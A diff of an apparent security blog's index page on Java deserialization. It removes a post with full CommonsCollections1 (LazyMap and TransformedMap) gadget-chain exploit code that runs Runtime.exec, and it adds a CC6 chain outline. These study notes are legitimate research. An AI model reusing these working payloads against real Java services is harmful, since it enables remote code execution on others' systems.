@@ -137,42 +137,6 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
-			<a href="/2023/11/30/java/cc/CommonsCollections/" >CommonsCollections</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2023-11-30  </div>
-		</div>
-	</div>
-	
-
-
-			<div class="entry">
-  <div class="row">
-	
-	
-		<h2 id="CC-GadgetChainMap"><a href="#CC-GadgetChainMap" class="headerlink" title="CC-GadgetChainMap"></a>CC-GadgetChainMap</h2><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231219123305619.png" alt="image-20231219123305619"></p>
-<h2 id="CC1-LazyMap"><a href="#CC1-LazyMap" class="headerlink" title="CC1_LazyMap"></a>CC1_LazyMap</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    Dependent version:</span></span><br><span class="line"><span class="comment">    commons-collections: 3.1</span></span><br><span class="line"><span class="comment">    Jdk &lt; 8u71</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Gadget chain:</span></span><br><span class="line"><span class="comment">		AnnotationInvocationHandler.readObject()</span></span><br><span class="line"><span class="comment">			Map(Proxy).entrySet()</span></span><br><span class="line"><span class="comment">				AnnotationInvocationHandler.invoke()</span></span><br><span class="line"><span class="comment">					LazyMap.get()</span></span><br><span class="line"><span class="comment">						ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">							ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">							InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections1_LazyMap</span> &#123;</span><br><span class="line">  	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(),chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// AnnotationInvocationHandler构造方法是default，不能直接获取，反射</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 创建动态代理对象，这里不用进入AnnotationInvocationHandler的if判断，第一个参数就可以随便传</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class,lazyMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 被动态代理的对象调用任意方法都会调用对应的代理类的invoke方法，AnnotationInvocationHandler.invoke() -&gt; LazyMap.get()</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,invocationHandler);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 实例化AnnotationInvocationHandler</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(Override.class,mapProxy);</span><br><span class="line"></span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(serialize(obj)));</span><br><span class="line">        deserialize(serialize(obj));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object obj) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="CC1-TransformedMap"><a href="#CC1-TransformedMap" class="headerlink" title="CC1_TransformedMap"></a>CC1_TransformedMap</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">```java</span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">import java.lang.annotation.Target;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.util.Base64;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">    Dependent version:</span><br><span class="line">    commons-collections: 3.1</span><br><span class="line">    Jdk &lt; 8u71</span><br><span class="line"></span><br><span class="line">	Gadget chain:</span><br><span class="line">		AnnotationInvocationHandler.readObject()</span><br><span class="line">			AnnotationInvocationHandler.setValue()</span><br><span class="line">			    TransformedMap.checkSetValue()</span><br><span class="line">				    ChainedTransformer.transform()</span><br><span class="line">					    ConstantTransformer.transform()</span><br><span class="line">					    InvokerTransformer.transform()</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">public class CommonsCollections1_TransformedMap &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        // 这里HashMap的key是下面初始化AnnotationInvocationHandler时传入的注解类中存在的属性值</span><br><span class="line">        HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        map.put(&quot;value&quot;,&quot;0&quot;);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        // AnnotationInvocationHandler是default，不能直接获取，反射</span><br><span class="line">        Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor  constructor = clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(true);</span><br><span class="line">        // 这里要进入AnnotationInvocationHandler的if判断</span><br><span class="line">        Object obj = constructor.newInstance(Target.class,transformedMap);</span><br><span class="line"></span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(serialize(obj)));</span><br><span class="line">        deserialize(serialize(obj));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void deserialize(byte[] bytes) throws Exception &#123;</span><br><span class="line">        ByteArrayInputStream bis = new ByteArrayInputStream(bytes);</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(bis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static byte[] serialize(Object obj) throws IOException &#123;</span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">        return byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
-	
-	</div>
-  <a type="button" href="/2023/11/30/java/cc/CommonsCollections/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
 			<a href="/2023/11/20/java/cc/CC3/" >CC3</a>
 		</h3>
 		</div>
@@ -194,6 +158,38 @@
 	
 	</div>
   <a type="button" href="/2023/11/20/java/cc/CC3/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2023/11/17/java/cc/CC6/" >CC6</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2023-11-17  </div>
+		</div>
+	</div>
+	
+
+
+			<div class="entry">
+  <div class="row">
+	
+	
+		<h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><h3 id="Gadget-chain"><a href="#Gadget-chain" class="headerlink" title="Gadget chain"></a>Gadget chain</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	Gadget chain:</span></span><br><span class="line"><span class="comment">	    java.io.ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">            java.util.HashSet.readObject()</span></span><br><span class="line"><span class="comment">                java.util.HashMap.put()</span></span><br><span class="line"><span class="comment">                java.util.HashMap.hash()</span></span><br><span class="line"><span class="comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span></span><br><span class="line"><span class="comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span></span><br><span class="line"><span class="comment">                        org.apache.commons.collections.map.LazyMap.get()</span></span><br><span class="line"><span class="comment">                       		org.apache.commons.collections.functors.ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                       		org.apache.commons.collections.functors.InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                            java.lang.reflect.Method.invoke()</span></span><br><span class="line"><span class="comment">                                java.lang.Runtime.exec()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    From：</span></span><br><span class="line"><span class="comment">    	ysoserial</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+
+<p>后面跟CC1一样，关注变化</p>
+<h3 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h3><h4 id="hashCode"><a href="#hashCode" class="headerlink" title="hashCode()"></a>hashCode()</h4><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231117203128744.png" alt="image-20231117203128744"></p>
+<h4 id="getValue"><a href="#getValue" class="headerlink" title="getValue()"></a>getValue()</h4><p>利用成：<code>LazyMap.get()</code></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231117203125346.png" alt="image-20231117203125346"></p>
+	
+	</div>
+  <a type="button" href="/2023/11/17/java/cc/CC6/#more" class="btn btn-default more">Read More</a>
 </div>
 
 		
@@ -244,8 +240,6 @@
 		<h4>Categories</h4>
 		<ul class="tag_box inline list-unstyled">
 		
-			<li><a href="/categories/Certifications/">Certifications<span>1</span></a></li>
-		
 			<li><a href="/categories/Java/">Java<span>12</span></a></li>
 		
 			<li><a href="/categories/Javascript/">Javascript<span>1</span></a></li>
@@ -275,43 +269,43 @@
 		
 			<li><a href="/tags/General/">General<span>1</span></a></li>
 		
+			<li><a href="/tags/Http/">Http<span>1</span></a></li>
+		
+			<li><a href="/tags/Pollution/">Pollution<span>2</span></a></li>
+		
 			<li><a href="/tags/Log4j2/">Log4j2<span>1</span></a></li>
 		
-			<li><a href="/tags/Enumeration/">Enumeration<span>4</span></a></li>
-		
-			<li><a href="/tags/Service-Test/">Service-Test<span>1</span></a></li>
-		
-			<li><a href="/tags/JNDI/">JNDI<span>1</span></a></li>
+			<li><a href="/tags/Shiro/">Shiro<span>1</span></a></li>
 		
 			<li><a href="/tags/Base/">Base<span>5</span></a></li>
+		
+			<li><a href="/tags/CommonsCollections/">CommonsCollections<span>5</span></a></li>
+		
+			<li><a href="/tags/Crack/">Crack<span>2</span></a></li>
 		
 			<li><a href="/tags/RMI/">RMI<span>1</span></a></li>
 		
 			<li><a href="/tags/HTB/">HTB<span>10</span></a></li>
 		
-			<li><a href="/tags/Shiro/">Shiro<span>1</span></a></li>
-		
-			<li><a href="/tags/Pollution/">Pollution<span>2</span></a></li>
-		
-			<li><a href="/tags/Fastjson/">Fastjson<span>1</span></a></li>
-		
-			<li><a href="/tags/Tunnel/">Tunnel<span>1</span></a></li>
-		
-			<li><a href="/tags/Web-Pentest/">Web-Pentest<span>9</span></a></li>
-		
 			<li><a href="/tags/CISCN/">CISCN<span>2</span></a></li>
 		
-			<li><a href="/tags/CommonsCollections/">CommonsCollections<span>5</span></a></li>
-		
-			<li><a href="/tags/Lateral-Movement/">Lateral-Movement<span>3</span></a></li>
-		
-			<li><a href="/tags/Crack/">Crack<span>2</span></a></li>
-		
-			<li><a href="/tags/Hash/">Hash<span>1</span></a></li>
+			<li><a href="/tags/Service-Test/">Service-Test<span>1</span></a></li>
 		
 			<li><a href="/tags/Deserialize/">Deserialize<span>7</span></a></li>
 		
-			<li><a href="/tags/Http/">Http<span>1</span></a></li>
+			<li><a href="/tags/Tunnel/">Tunnel<span>1</span></a></li>
+		
+			<li><a href="/tags/Enumeration/">Enumeration<span>4</span></a></li>
+		
+			<li><a href="/tags/Fastjson/">Fastjson<span>1</span></a></li>
+		
+			<li><a href="/tags/Web-Pentest/">Web-Pentest<span>9</span></a></li>
+		
+			<li><a href="/tags/JNDI/">JNDI<span>1</span></a></li>
+		
+			<li><a href="/tags/Lateral-Movement/">Lateral-Movement<span>3</span></a></li>
+		
+			<li><a href="/tags/Hash/">Hash<span>1</span></a></li>
 		
 		
 		   <li><a href="/tags">...<span>21</span></a></li>
@@ -327,10 +321,6 @@
   <ul class="entry list-unstyled">
     
       <li>
-        <a href="/2025/01/29/htb-cpts/" ><i class="fa fa-file-o"></i>HTB CPTS</a>
-      </li>
-    
-      <li>
         <a href="/2024/11/20/pentest/lateral/Active Directory Enumeration &amp; Attacks/" ><i class="fa fa-file-o"></i>Active Directory Enumeratio...</a>
       </li>
     
@@ -344,6 +334,10 @@
     
       <li>
         <a href="/2024/10/16/pentest/web-pentest/Command Injections/" ><i class="fa fa-file-o"></i>Command Injections</a>
+      </li>
+    
+      <li>
+        <a href="/2024/10/14/pentest/web-pentest/File Upload/" ><i class="fa fa-file-o"></i>File Upload</a>
       </li>
     
   </ul>
